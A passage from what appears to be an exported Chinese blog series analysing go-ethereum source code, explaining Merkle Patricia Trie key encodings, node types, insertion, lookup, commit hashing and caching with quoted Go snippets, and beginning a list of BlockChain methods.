0001)=17。\nHP编码的规则如下：\n\nkey结尾为0x10，则去掉这个终止符\nkey之前补一个四元组这个Byte第0位区分奇偶信息，第 1 位区分节点类型\n如果输入key的长度是偶数，则再添加一个四元组0x0在flag四元组后\n将原来的key内容压缩，将分离的两个byte以高四位低四位进行合并\n\n\n十六进制前缀编码相当于一个逆向的过程，比如输入的是[6 2 6 15 6 2 16]，\n根据第一个规则去掉终止符16。根据第二个规则key前补一个四元组，从右往左第一位为1表示叶子节点，\n从右往左第0位如果后面key的长度为偶数设置为0，奇数长度设置为1，那么四元组0010就是2。\n根据第三个规则，添加一个全0的补在后面，那么就是20.根据第三个规则内容压缩合并，那么结果就是[0x20 0x62 0x6f 0x62]\n\nHP 编码源码实现:\nfunc hexToCompact(hex []byte) []byte {\n\tterminator := byte(0) //初始化一个值为0的byte，它就是我们上面公式中提到的t\n\tif hasTerm(hex) {     //验证hex有后缀编码，\n\t\tterminator = 1         //hex编码有后缀，则t=1\n\t\thex = hex[:len(hex)-1] //此处只是去掉后缀部分的hex编码\n\t}\n\t////Compact开辟的空间长度为hex编码的一半再加1，这个1对应的空间是Compact的前缀\n\tbuf := make([]byte, len(hex)/2+1)\n\t////这一阶段的buf[0]可以理解为公式中的16*f(t)\n\tbuf[0] = terminator &lt;&lt; 5 // the flag byte\n\tif len(hex)&amp;1 == 1 {     //hex 长度为奇数，则逻辑上说明hex有前缀\n\t\tbuf[0] |= 1 &lt;&lt; 4 ////这一阶段的buf[0]可以理解为公式中的16*（f(t)+1）\n\t\tbuf[0] |= hex[0] // first nibble is contained in the first byte\n\t\thex = hex[1:]    //此时获取的hex编码无前缀无后缀\n\t}\n\tdecodeNibbles(hex, buf[1:]) //将hex编码映射到compact编码中\n\treturn buf                  //返回compact编码\n}\n以上三种编码方式的转换关系为：\n\nRaw编码：原生的key编码，是MPT对外提供接口中使用的编码方式，当数据项被插入到树中时，Raw编码被转换成Hex编码；\nHex编码：16进制扩展编码，用于对内存中树节点key进行编码，当树节点被持久化到数据库时，Hex编码被转换成HP编码；\nHP编码：16进制前缀编码，用于对数据库中树节点key进行编码，当树节点被加载到内存时，HP编码被转换成Hex编码；\n\n如下图：\n\n以上介绍的MPT树，可以用来存储内容为任何长度的key-value数据项。倘若数据项的key长度没有限制时，当树中维护的数据量较大时，仍然会造成整棵树的深度变得越来越深，会造成以下影响：\n\n查询一个节点可能会需要许多次 IO 读取，效率低下；\n系统易遭受 Dos 攻击，攻击者可以通过在合约中存储特定的数据，“构造”一棵拥有一条很长路径的树，然后不断地调用SLOAD指令读取该树节点的内容，造成系统执行效率极度下降；\n所有的 key 其实是一种明文的形式进行存储；\n\n为了解决以上问题，以太坊对MPT再进行了一次封装，对数据项的key进行了一次哈希计算，因此最终作为参数传入到MPT接口的数据项其实是(sha3(key), value)\n优势：\n\n传入MPT接口的 key 是固定长度的（32字节），可以避免出现树中出现长度很长的路径；\n\n劣势：\n\n每次树操作需要增加一次哈希计算；\n需要在数据库中存储额外的sha3(key)与key之间的对应关系；\n\n完整的编码流程如图：\n\nMPT轻节点\n上面的MPT树，有两个问题：\n\n每个节点都包含有大量信息，并且叶子节点中还包含有完整的数据信息。如果该MPT树并没有发生任何变化，并且没有被使用，则会白白占用一大片空间，想象一个以太坊，有多少个MPT树，都在内存中，那还了得。\n并不是任何的客户端都对所有的MPT树都感兴趣，若每次都把完整的节点信息都下载下，下载时间长不说，并且会占用大量的磁盘空间。\n\n解决方式\n为了解决上述问题，以太坊使用了一种缓存机制，可以称为是轻节点机制，大体如下：\n\n若某节点数据一直没有发生变化，则仅仅保留该节点的32位hash值，剩下的内容全部释放\n若需要插入或者删除某节点，先通过该hash值db中查找对应的节点，并加载到内存，之后再进行删除插入操作\n\n轻节点中添加数据\n内存中只有这么一个轻节点，但是我要添加一个数据，也就是要给完整的MPT树中添加一个叶子节点，怎么添加？大体如下图所示：\n\n到此以太坊的MPT树的基础讲解结束。\n参考\n\nmindcarver.cn\ngithub.com/blockchainGuide 文章及视频学习资料\neth.wiki/en/fundamentals/patricia-tree\nethereum.github.io/yellowpaper/paper.pdf#appendix.D\nethfans.org/toya/articles/588\nlearnblockchain.cn/books/geth/part3/mpt.html\nblog.ethereum.org/2015/11/15/merkling-in-ethereum/\narxiv.org/pdf/1909.11590.pdf\nlearnblockchain.cn/books/geth/part3/mpt.html\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之MPT树-下-14":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之MPT树-下-14","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之MPT树-下-14.md","title":"死磕以太坊源码分析之MPT树-下-14","links":[],"tags":[],"content":"\n死磕以太坊源码分析之MPT树-下\n文章以及资料请查看：github.com/blockchainGuide/\n\n上篇主要介绍了以太坊中的MPT树的原理，这篇主要会对MPT树涉及的源码进行拆解分析。trie模块主要有以下几个文件：\n|-encoding.go 主要讲编码之间的转换\n|-hasher.go 实现了从某个结点开始计算子树的哈希的功能\n|-node.go 定义了一个Trie树中所有结点的类型和解析的代码\n|-sync.go 实现了SyncTrie对象的定义和所有方法\n|-iterator.go 定义了所有枚举相关接口和实现\n|-secure_trie.go 实现了SecureTrie对象\n|-proof.go 为key构造一个merkle证明\n|-trie.go Trie树的增删改查\n|-database.go 对内存中的trie树节点进行引用计数\n实现概览\nencoding.go\n这个主要是讲三种编码（KEYBYTES encoding、HEX encoding、COMPACT encoding）的实现与转换，trie中全程都需要用到这些，该文件中主要实现了如下功能：\n\nhex编码转换为Compact编码：hexToCompact()\nCompact编码转换为hex编码：compactToHex()\nkeybytes编码转换为Hex编码：keybytesToHex()\nhex编码转换为keybytes编码：hexToKeybytes()\n获取两个字节数组的公共前缀的长度：prefixLen()\n\nfunc hexToCompact(hex []byte) []byte {\n    terminator := byte(0)\n    if hasTerm(hex) { //检查是否有结尾为0x10 =&gt; 16\n        terminator = 1 //有结束标记16说明是叶子节点\n        hex = hex[:len(hex)-1] //去除尾部标记\n    }\n    buf := make([]byte, len(hex)/2+1) // 字节数组\n    \n    buf[0] = terminator &lt;&lt; 5 // 标志byte为00000000或者00100000\n    //如果长度为奇数，添加奇数位标志1，并把第一个nibble字节放入buf[0]的低四位\n    if len(hex)&amp;1 == 1 {\n        buf[0] |= 1 &lt;&lt; 4 // 奇数标志 00110000\n        buf[0] |= hex[0] // 第一个nibble包含在第一个字节中 0011xxxx\n        hex = hex[1:]\n    }\n    //将两个nibble字节合并成一个字节\n    decodeNibbles(hex, buf[1:])\n    return buf\n  \n//compact编码转化为Hex编码\nfunc compactToHex(compact []byte) []byte {\n    base := keybytesToHex(compact)\n    base = base[:len(base)-1]\n     // apply terminator flag\n    // base[0]包括四种情况\n    // 00000000 扩展节点偶数位\n    // 00000001 扩展节点奇数位\n    // 00000010 叶子节点偶数位\n    // 00000011 叶子节点奇数位\n \n    // apply terminator flag\n    if base[0] &gt;= 2 {\n       //如果是叶子节点，末尾添加Hex标志位16\n        base = append(base, 16)\n    }\n    // apply odd flag\n    //如果是偶数位，chop等于2，否则等于1\n    chop := 2 - base[0]&amp;1\n    return base[chop:]\n}\n//compact编码转化为Hex编码\nfunc compactToHex(compact []byte) []byte {\n    base := keybytesToHex(compact)\n    base = base[:len(base)-1]\n     // apply terminator flag\n    // base[0]包括四种情况\n    // 00000000 扩展节点偶数位\n    // 00000001 扩展节点奇数位\n    // 00000010 叶子节点偶数位\n    // 00000011 叶子节点奇数位\n \n    // apply terminator flag\n    if base[0] &gt;= 2 {\n       //如果是叶子节点，末尾添加Hex标志位16\n        base = append(base, 16)\n    }\n    // apply odd flag\n    //如果是偶数位，chop等于2，否则等于1\n    chop := 2 - base[0]&amp;1\n    return base[chop:]\n}\n// 将十六进制的bibbles转成key bytes，这只能用于偶数长度的key\nfunc hexToKeybytes(hex []byte) []byte {\n    if hasTerm(hex) {\n        hex = hex[:len(hex)-1]\n    }\n    if len(hex)&amp;1 != 0 {\n        panic(&quot;can&#039;t convert hex key of odd length&quot;)\n    }\n    key := make([]byte, (len(hex)+1)/2)\n    decodeNibbles(hex, key)\n    return key\n}\n \n \n// 返回a和b的公共前缀的长度\nfunc prefixLen(a, b []byte) int {\n    var i, length = 0, len(a)\n    if len(b) &lt; length {\n        length = len(b)\n    }\n    for ; i &lt; length; i++ {\n        if a[i] != b[i] {\n            break\n        }\n    }\n    return i\n}\n \n \nnode.go\n四种节点\nnode 接口分四种实现: fullNode，shortNode，valueNode，hashNode，其中只有 fullNode 和 shortNode 可以带有子节点。\ntype (\n\tfullNode struct {\n\t\tChildren [17]node // 分支节点\n\t\tflags    nodeFlag\n\t}\n\tshortNode struct { //扩展节点\n\t\tKey   []byte\n\t\tVal   node //可能指向叶子节点，也可能指向分支节点。\n\t\tflags nodeFlag\n\t}\n\thashNode  []byte\n\tvalueNode []byte // 叶子节点值，但是该叶子节点最终还是会包装在shortNode中\n)\ntrie.go\nTrie对象实现了MPT树的所有功能，包括(key, value)对的增删改查、计算默克尔哈希，以及将整个树写入数据库中。\niterator.go\nnodeIterator提供了遍历树内部所有结点的功能。其结构如下：此结构体是在trie.go定义的\ntype nodeIterator struct {\n\ttrie.NodeIterator\n\tt   *odrTrie\n\terr error\n}\n里面包含了一个接口NodeIterator，它的实现则是由iterator.go来提供的，其方法如下：\nfunc (it *nodeIterator) Next(descend bool) bool \nfunc (it *nodeIterator) Hash() common.Hash \nfunc (it *nodeIterator) Parent() common.Hash \nfunc (it *nodeIterator) Leaf() bool \nfunc (it *nodeIterator) LeafKey() []byte \nfunc (it *nodeIterator) LeafBlob() []byte \nfunc (it *nodeIterator) LeafProof() [][]byte \nfunc (it *nodeIterator) Path() []byte {}\nfunc (it *nodeIterator) seek(prefix []byte) error \nfunc (it *nodeIterator) peek(descend bool) (*nodeIteratorState, *int, []byte, error) \nfunc (it *nodeIterator) nextChild(parent *nodeIteratorState, ancestor common.Hash) (*nodeIteratorState, []byte, bool) \nfunc (it *nodeIterator) push(state *nodeIteratorState, parentIndex *int, path []byte) \nfunc (it *nodeIterator) pop() \nNodeIterator的核心是Next方法，每调用一次这个方法，NodeIterator对象代表的当前节点就会更新至下一个节点，当所有结点遍历结束，Next方法返回false。\n生成NodeIterator结口的方法有以下3种：\n①：Trie.NodeIterator(start []byte)\n通过start参数指定从哪个路径开始遍历，如果为nil则从头到尾按顺序遍历。\n②：NewDifferenceIterator(a, b NodeIterator)\n当调用NewDifferenceIterator(a, b NodeIterator)后，生成的NodeIterator只遍历存在于 b 但不存在于 a 中的结点。\n③：NewUnionIterator(iters []NodeIterator)\n当调用NewUnionIterator(its []NodeIterator)后，生成的NodeIterator遍历的结点是所有传入的结点的合集。\ndatabase.go\nDatabase是trie模块对真正数据库的缓存层，其目的是对缓存的节点进行引用计数，从而实现区块的修剪功能。主要方法如下：\nfunc NewDatabase(diskdb ethdb.KeyValueStore) *Database\nfunc NewDatabaseWithCache(diskdb ethdb.KeyValueStore, cache int) *Database \nfunc (db *Database) DiskDB() ethdb.KeyValueReader\nfunc (db *Database) InsertBlob(hash common.Hash, blob []byte)\nfunc (db *Database) insert(hash common.Hash, blob []byte, node node)\nfunc (db *Database) insertPreimage(hash common.Hash, preimage []byte)\nfunc (db *Database) node(hash common.Hash) node\nfunc (db *Database) Node(hash common.Hash) ([]byte, error)\nfunc (db *Database) preimage(hash common.Hash) ([]byte, error)\nfunc (db *Database) secureKey(key []byte) []byte\nfunc (db *Database) Nodes() []common.Hash\nfunc (db *Database) Reference(child common.Hash, parent common.Hash)\nfunc (db *Database) Dereference(root common.Hash)\nfunc (db *Database) dereference(child common.Hash, parent common.Hash)\nfunc (db *Database) Cap(limit common.StorageSize) error\nfunc (db *Database) Commit(node common.Hash, report bool) error\nsecurity_trie.go\n可以理解为加密了的trie的实现，ecurity_trie包装了一下trie树， 所有的key都转换成keccak256算法计算的hash值。同时在数据库里面存储hash值对应的原始的key。\n但是官方在代码里也注释了，这个代码不稳定，除了测试用例，别的地方并没有使用该代码。\nproof.go\n\nProve()：根据给定的key，在trie中，将满足key中最大长度前缀的路径上的节点都加入到proofDb（队列中每个元素满足：未编码的hash以及对应rlp编码后的节点）\nVerifyProof()：验证proffDb中是否存在满足输入的hash，和对应key的节点，如果满足，则返回rlp解码后的该节点。\n\n实现细节\nTrie对象的增删改查\n①：Trie树的初始化\n如果root不为空，就通过resolveHash来加载整个Trie树，如果为空，就新建一个Trie树。\nfunc New(root common.Hash, db *Database) (*Trie, error) {\n\tif db == nil {\n\t\tpanic(&quot;trie.New called without a database&quot;)\n\t}\n\ttrie := &amp;Trie{\n\t\tdb: db,\n\t}\n\tif root != (common.Hash{}) &amp;&amp; root != emptyRoot {\n\t\trootnode, err := trie.resolveHash(root[:], nil)\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\ttrie.root = rootnode\n\t}\n\treturn trie, nil\n}\n②：Trie树的插入\n首先Trie树的插入是个递归调用的过程，它会从根开始找，一直找到合适的位置插入。\nfunc (t *Trie) insert(n node, prefix, key []byte, value node) (bool, node, error)\n参数说明：\n\nn: 当前要插入的节点\nprefix: 当前已经处理完的key(节点共有的前缀)\nkey: 未处理完的部分key，完整的key = prefix + key\nvalue：需要插入的值\n\n返回值说明：\n\nbool : 操作是否改变了Trie树(dirty)\nNode :插入完成后的子树的根节点\n\n接下来就是分别对shortNode、fullNode、hashNode、nil 几种情况进行说明。\n2.1：节点为nil\n空树直接返回shortNode， 此时整颗树的根就含有了一个shortNode节点。\ncase nil:\n\t\treturn true, &amp;shortNode{key, value, t.newFlag()}, nil\n2.2 ：节点为shortNode\n\n\n首先计算公共前缀，如果公共前缀就等于key，那么说明这两个key是一样的，如果value也一样的(dirty == false)，那么返回错误。\n\n\n如果没有错误就更新shortNode的值然后返回\n\n\n如果公共前缀不完全匹配，那么就需要把公共前缀提取出来形成一个独立的节点(扩展节点),扩展节点后面连接一个branch节点，branch节点后面看情况连接两个short节点。\n\n\n首先构建一个branch节点(branch := &amp;fullNode{flags: t.newFlag()}),然后再branch节点的Children位置调用t.insert插入剩下的两个short节点\n\n\nmatchlen := prefixLen(key, n.Key)\n\t\tif matchlen == len(n.Key) {\n\t\t\tdirty, nn, err := t.insert(n.Val, append(prefix, key[:matchlen]...), key[matchlen:], value)\n\t\t\tif !dirty || err != nil {\n\t\t\t\treturn false, n, err\n\t\t\t}\n\t\t\treturn true, &amp;shortNode{n.Key, nn, t.newFlag()}, nil\n\t\t}\n\t\tbranch := &amp;fullNode{flags: t.newFlag()}\n\t\tvar err error\n\t\t_, branch.Children[n.Key[matchlen]], err = t.insert(nil, append(prefix, n.Key[:matchlen+1]...), n.Key[matchlen+1:], n.Val)\n\t\tif err != nil {\n\t\t\treturn false, nil, err\n\t\t}\n\t\t_, branch.Children[key[matchlen]], err = t.insert(nil, append(prefix, key[:matchlen+1]...), key[matchlen+1:], value)\n\t\tif err != nil {\n\t\t\treturn false, nil, err\n\t\t}\n\t\tif matchlen == 0 {\n\t\t\treturn true, branch, nil\n    }\n\t\treturn true, &amp;shortNode{key[:matchlen], branch, t.newFlag()}, nil\n2.3: 节点为fullNode\n节点是fullNode(也就是分支节点)，那么直接往对应的孩子节点调用insert方法,然后把对应的孩子节点指向新生成的节点。\ndirty, nn, err := t.insert(n.Children[key[0]], append(prefix, key[0]), key[1:], value)\n\t\tif !dirty || err != nil {\n\t\t\treturn false, n, err\n\t\t}\n\t\tn = n.copy()\n\t\tn.flags = t.newFlag()\n\t\tn.Children[key[0]] = nn\n\t\treturn true, n, nil\n2.4: 节点为hashnode\n暂时还在数据库中的节点，先调用 t.resolveHash(n, prefix)来加载到内存，然后调用insert方法来插入。\nrn, err := t.resolveHash(n, prefix)\n\t\tif err != nil {\n\t\t\treturn false, nil, err\n\t\t}\n\t\tdirty, nn, err := t.insert(rn, prefix, key, value)\n\t\tif !dirty || err != nil {\n\t\t\treturn false, rn, err\n\t\t}\n\t\treturn true, nn, nil\n③：Trie树查询值\n其实就是根据输入的hash，找到对应的叶子节点的数据。主要看TryGet方法。\n参数：\n\norigNode：当前查找的起始node位置\nkey：输入要查找的数据的hash\npos：当前hash匹配到第几位\n\nfunc (t *Trie) tryGet(origNode node, key []byte, pos int) (value []byte, newnode node, didResolve bool, err error) {\n\tswitch n := (origNode).(type) {\n\tcase nil: //表示当前trie是空树\n\t\treturn nil, nil, false, nil\n\tcase valueNode: ////这就是我们要查找的叶子节点对应的数据\n\t\treturn n, n, false, nil\n\tcase *shortNode: ////在叶子节点或者扩展节点匹配\n\t\tif len(key)-pos &lt; len(n.Key) || !bytes.Equal(n.Key, key[pos:pos+len(n.Key)]) {\n\t\t\treturn nil, n, false, nil\n\t\t}\n\t\tvalue, newnode, didResolve, err = t.tryGet(n.Val, key, pos+len(n.Key))\n\t\tif err == nil &amp;&amp; didResolve {\n\t\t\tn = n.copy()\n\t\t\tn.Val = newnode\n\t\t}\n\t\treturn value, n, didResolve, err\n\tcase *fullNode://在分支节点匹配\n\t\tvalue, newnode, didResolve, err = t.tryGet(n.Children[key[pos]], key, pos+1)\n\t\tif err == nil &amp;&amp; didResolve {\n\t\t\tn = n.copy()\n\t\t\tn.Children[key[pos]] = newnode\n\t\t}\n\t\treturn value, n, didResolve, err\n\tcase hashNode: //说明当前节点是轻节点，需要从db中获取\n\t\tchild, err := t.resolveHash(n, key[:pos])\n\t\tif err != nil {\n\t\t\treturn nil, n, true, err\n\t\t}\n\t\tvalue, newnode, _, err := t.tryGet(child, key, pos)\n\t\treturn value, newnode, true, err\n...\n}\ndidResolve用于判断trie树是否会发生变化，tryGet()只是用来获取数据的，当hashNode去db中获取该node值后需要更新现有的trie，didResolve就会发生变化。其他就是基本的递归查找树操作。\n④：Trie树更新值\n更新值，其实就是调用insert方法进行操作。\n到此Trie树的增删改查就讲解的差不多了。\n将节点写入到Trie的内存数据库\n如果要把节点写入到内存数据库，需要序列化，可以先去了解下以太坊的Rlp编码。这部分工作由trie.Commit()完成，当trie.Commit(nil)，会执行序列化和缓存等操作，序列化之后是使用的Compact Encoding进行编码，从而达到节省空间的目的。\nfunc (t *Trie) Commit(onleaf LeafCallback) (root common.Hash, err error) {\n\tif t.db == nil {\n\t\tpanic(&quot;commit called on trie with nil database&quot;)\n\t}\n\thash, cached, err := t.hashRoot(t.db, onleaf)\n\tif err != nil {\n\t\treturn common.Hash{}, err\n\t}\n\tt.root = cached\n\treturn common.BytesToHash(hash.(hashNode)), nil\n}\n上述代码大概讲了这些：\n\n每次执行Commit()，该trie的cachegen就会加 1\nCommit()方法返回的是trie.root所指向的node的hash（未编码）\n其中的hashRoot()方法目的是返回trie.root所指向的node的hash以及每个节点都带有各自hash的trie树的root。\n\n//为每个node生成一个hash\nfunc (t *Trie) hashRoot(db *Database, onleaf LeafCallback) (node, node, error) {\n\tif t.root == nil {\n\t\treturn hashNode(emptyRoot.Bytes()), nil, nil\n\t}\n\th := newHasher(onleaf)\n\tdefer returnHasherToPool(h)\n\treturn h.hash(t.root, db, true) //为每个节点生成一个未编码的hash\n}\n而hashRoot的核心方法就是 h.hash，它返回了头节点的hash以及每个子节点都带有hash的头节点（Trie.root指向它），大致做了以下几件事：\n①：如果我们不存储节点，而只是哈希，则从缓存中获取数据\nif hash, dirty := n.cache(); hash != nil {\n\t\tif db == nil {\n\t\t\treturn hash, n, nil\n\t\t}\n\t\tif !dirty {\n\t\t\tswitch n.(type) {\n\t\t\tcase *fullNode, *shortNode:\n\t\t\t\treturn hash, hash, nil\n\t\t\tdefault:\n\t\t\t\treturn hash, n, nil\n\t\t\t}\n\t\t}\n\t}\n②：递归调用h.hashChildren，求出所有的子节点的hash值，再把原有的子节点替换成现在子节点的hash值\n2.1:如果节点是shortNode\n首先把collapsed.Key从Hex Encoding 替换成 Compact Encoding, 然后递归调用hash方法计算子节点的hash和cache，从而把子节点替换成了子节点的hash值\ncollapsed, cached := n.copy(), n.copy()\n\t\tcollapsed.Key = hexToCompact(n.Key)\n\t\tcached.Key = common.CopyBytes(n.Key)\n \n\t\tif _, ok := n.Val.(valueNode); !ok {\n\t\t\tcollapsed.Val, cached.Val, err = h.hash(n.Val, db, false)\n\t\t\tif err != nil {\n\t\t\t\treturn original, original, err\n\t\t\t}\n\t\t}\n\t\treturn collapsed, cached, nil\n2.2:节点是fullNode\n遍历每个子节点，把子节点替换成子节点的Hash值，否则的化这个节点没有children。直接返回。\n\t\tcollapsed, cached := n.copy(), n.copy()\n \n\t\tfor i := 0; i &lt; 16; i++ {\n\t\t\tif n.Children[i] != nil {\n\t\t\t\tcollapsed.Children[i], cached.Children[i], err = h.hash(n.Children[i], db, false)\n\t\t\t\tif err != nil {\n\t\t\t\t\treturn original, original, err\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tcached.Children[16] = n.Children[16]\n\t\treturn collapsed, cached, nil\n③：存储节点n的哈希值，如果我们指定了存储层，它会写对应的键/值对\nstore()方法主要就做了两件事：\n\nrlp序列化collapsed节点并将其插入db磁盘中\n生成当前节点的hash\n将节点哈希插入db\n\n3.1：空数据或者hashNode，则不处理\nif _, isHash := n.(hashNode); n == nil || isHash {\n\t\treturn n, nil\n\t}\n3.2:生成节点的RLP编码\nh.tmp.Reset()                                 // 缓存初始化\n\tif err := rlp.Encode(&amp;h.tmp, n); err != nil { //将当前node序列化\n\t\tpanic(&quot;encode error: &quot; + err.Error())\n\t}\n\tif len(h.tmp) &lt; 32 &amp;&amp; !force {\n\t\treturn n, nil // Nodes smaller than 32 bytes are stored inside their parent 编码后的node长度小于32，若force为true，则可确保所有节点都被编码\n\t}\n//长度过大的，则都将被新计算出来的hash取代\n\thash, _ := n.cache() //取出当前节点的hash\n\tif hash == nil {\n\t\thash = h.makeHashNode(h.tmp) //生成哈希node\n\t}\n3.3:将Trie节点合并到中间内存缓存中\nhash := common.BytesToHash(hash)\n\t\tdb.lock.Lock()\n\t\tdb.insert(hash, h.tmp, n)\n\t\tdb.lock.Unlock()\n\t\t// Track external references from account-&gt;storage trie\n\t\t//跟踪帐户-&gt;存储Trie中的外部引用\n\t\tif h.onleaf != nil {\n\t\t\tswitch n := n.(type) {\n\t\t\tcase *shortNode:\n\t\t\t\tif child, ok := n.Val.(valueNode); ok {  //指向的是分支节点\n\t\t\t\t\th.onleaf(child, hash) //用于统计当前节点的信息，比如当前节点有几个子节点，当前有效的节点数\n\t\t\t\t}\n\t\t\tcase *fullNode:\n\t\t\t\tfor i := 0; i &lt; 16; i++ {\n\t\t\t\t\tif child, ok := n.Children[i].(valueNode); ok {\n\t\t\t\t\t\th.onleaf(child, hash)\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n到此为止将节点写入到Trie的内存数据库就已经完成了。\n如果觉得文章不错可以关注公众号：区块链技术栈，详细的所有以太坊源码分析文章内容以及代码资料都在其中。\nTrie树缓存机制\nTrie树的结构里面有两个参数， 一个是cachegen,一个是cachelimit。这两个参数就是cache控制的参数。 Trie树每一次调用Commit方法，会导致当前的cachegen增加1。\nfunc (t *Trie) Commit(onleaf LeafCallback) (root common.Hash, err error) {\n   ...\n    t.cachegen++\n   ...\n}\n然后在Trie树插入的时候，会把当前的cachegen存放到节点中。\nfunc (t *Trie) insert(n node, prefix, key []byte, value node) (bool, node, error) {\n            ....\n            return true, &amp;shortNode{n.Key, nn, t.newFlag()}, nil\n}\nfunc (t *Trie) newFlag() nodeFlag {\n    return nodeFlag{dirty: true, gen: t.cachegen}\n}\n \n如果 trie.cachegen - node.cachegen &gt; cachelimit，就可以把节点从内存里面拿掉。 也就是说节点经过几次Commit，都没有修改，那么就把节点从内存里面干掉。 只要trie路径上新增或者删除一个节点，整个路径的节点都需要重新实例化，也就是节点中的nodeFlag被初始化了。都需要重新更新到db磁盘。\n拿掉节点过程在 hasher.hash方法中， 这个方法是在commit的时候调用。如果方法的canUnload方法调用返回真，那么就拿掉节点，如果只返回了hash节点，而没有返回node节点，这样节点就没有引用，不久就会被gc清除掉。 节点被拿掉之后，会用一个hashNode节点来表示这个节点以及其子节点。 如果后续需要使用，可以通过方法把这个节点加载到内存里面来。\nfunc (h *hasher) hash(n node, db *Database, force bool) (node, node, error) {\n   \t....\n       // 从缓存中卸载节点。它的所有子节点将具有较低或相等的缓存世代号码。\n       cacheUnloadCounter.Inc(1)\n  ...\n}\n参考&amp;总结\n这部分重要的内容也就上面讲述的，主要集中在Trie上面，如果有不对的地方，可以及时指正哦。\n\nmindcarver.cn/about/\ngithub.com/blockchainGuide/blockchainguide\n"},"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之blockChain分析-11":{"slug":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之blockChain分析-11","filePath":"blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/以太坊源码分析/死磕以太坊源码分析之blockChain分析-11.md","title":"死磕以太坊源码分析之blockChain分析-11","links":[],"tags":[],"content":"\n死磕以太坊源码分析之blockChain分析\n配合以下代码进行阅读：github.com/blockchainGuide/\n写文不易，给个小关注，有什么问题可以指出，便于大家交流学习。\n\nblockchain关键元素\n\ndb：持久化到底层数据储存，即leveldb；\ngenesisBlock：创始区块\ncurrentBlock：当前区块，blockchain中并不是储存链所有的block，而是通过currentBlock向前回溯直到genesisBlock，这样就构成了区块链\nbodyCache、bodyRLPCache、blockCache、futureBlocks：区块链中的缓存结构，用于加快区块链的读取和构建；\nhc：headerchain区块头链，由blockchain额外维护的另一条链，由于Header和Block的储存空间是有很大差别的，但同时Block的Hash值就是Header（RLP）的Hash值，所以维护一个headerchain可以用于快速延长链，验证通过后再下载blockchain，或者可以与blockchain进行相互验证；\nprocessor：执行区块链交易的接口，收到一个新的区块时，要对区块中的所有交易执行一遍，一方面是验证，一方面是更新世界状态；\nvalidator：验证数据有效性的接口\nfutureBlocks：收到的区块时间大于当前头区块时间15s而小于30s的区块，可作为当前节点待处理的区块。\n\n\n函数介绍\n// BadBlocks 处理客户端从网络上获取的最近的bad block列表\nfunc (bc *BlockChain) BadBlocks() []*types.Block {}\n \n// addBadBlock 把bad block放入缓存\nfunc (bc *BlockChain) addBadBlock(block *types.Block) {}\n// CurrentBlock取回主链的当前头区块，这个区块是从blockchian的内部缓存中取得\nfunc (bc *BlockChain) CurrentBlock() *types.Block {}\n \n// CurrentHeader检索规范链的当前头区块header。从HeaderChain的内部缓存中检索标头。\nfunc (bc *BlockChain) CurrentHeader() *types.Header{}\n \n// CurrentFastBlock取回主链的当前fast-sync头区块，这个区块是从blockchian的内部缓存中取得\nfunc (bc *BlockChain) CurrentFastBlock() *types.Block {}\n// 将活动链或其子集写入给定的编写器.\nfunc (bc *BlockChain) Export(w io.Writer) error {}\nfunc (bc *BlockChain) ExportN(w io.Writer, first uint64, last uint64) error {}\n// FastSyncCommitHead快速同步，将当前头块设置为特定hash的区块。\nfunc (bc *BlockChain) FastSyncCommitHead(hash common.Hash) error {}\n// GasLimit返回当前头区块的gas limit\nfunc (bc *BlockChain) GasLimit() uint64 {}\n// Genesis 取回genesis区块\nfunc (bc *BlockChain) Genesis() *types.Block {}\n// 通过hash从数据库或缓存中取到一个区块体(transactions and uncles)或RLP数据\nfunc (bc *BlockChain) GetBody(hash common.Hash) *types.Body {}\nfunc (bc *BlockChain) GetBodyRLP(hash common.Hash) rlp.RawValue {}\n// GetBlock 通过hash和number取到区块\nfunc (bc *BlockChain) GetBlock(hash common.Hash, number uint64) *types.Block {}\n// GetBlockByHash 通过hash取到区块\nfunc (bc *BlockChain) GetBlockByHash(hash common.Hash) *types.Block {}\n// GetBlockByNumber 通过number取到区块\nfunc (bc *BlockChain) GetBlockByNumber(number uint64) *types.Block {}\n// 获取给定hash和number区块的header\nfunc (bc *BlockChain) GetHeader(hash common.Hash, number uint64) *types.Header{}\n \n// 获取给定hash的区块header\nfunc (bc *BlockChain) GetHeaderByHash(hash common.Hash) *types.Header{}\n \n// 获取给定number的区块header\nfunc (bc *BlockChain) GetHeaderByNumber(number uint64) *types.Header{}\n// HasBlock检验hash对应的区块是否完全存在数据库中\nfunc (bc *BlockChain) HasBlock(hash common.Hash, number uint64) bool {}\n \n// 检查给定hash和number的区块的区块头是否存在数据库\nfunc (bc *BlockChain) HasHeader(hash common.Hash, number uint64) bool{}\n \n// HasState检验state trie是否完全存在数据库中\nfunc (bc *BlockChain) HasState(hash common.Hash) bool {}\n \n// HasBlockAndState检验hash对应的block和state trie是否完全存在数据库中\nfunc (bc *BlockChain) HasBlockAndState(hash common.Hash, number uint64) bool {}\n// 获取给定hash的区块的总难度\nfunc (bc *BlockChain) GetTd(hash common.Hash, number uint64) *big.Int{}\n// 获取从给定hash的区块到genesis区块的所有hash\nfunc (bc *BlockChain) GetBlockHashesFromHash(hash common.Hash, max uint64) []common.Hash{}\n \n// GetReceiptsByHash 在特定的区块中取到所有交易的收据\nfunc (bc *BlockChain) GetReceiptsByHash(hash common.Hash) types.Receipts {}\n \n// GetBlocksFromHash 取到特定hash的区块及其n-1个父区块\nfunc (bc *BlockChain) GetBlocksFromHash(hash common.Hash, n int) (blocks []*types.Block) {}\n \n// GetUnclesInChain 取回从给定区块到向前回溯特定距离到区块上的所有叔区块\nfunc (bc *BlockChain) GetUnclesInChain(block *types.Block, length int) []*types.Header {}\n// insert 将新的头块注入当前块链。 该方法假设该块确实是真正的头。\n// 如果它们较旧或者它们位于不同的侧链上，它还会将头部标题和头部快速同步块重置为同一个块。\nfunc (bc *BlockChain) insert(block *types.Block) {}\n \n// 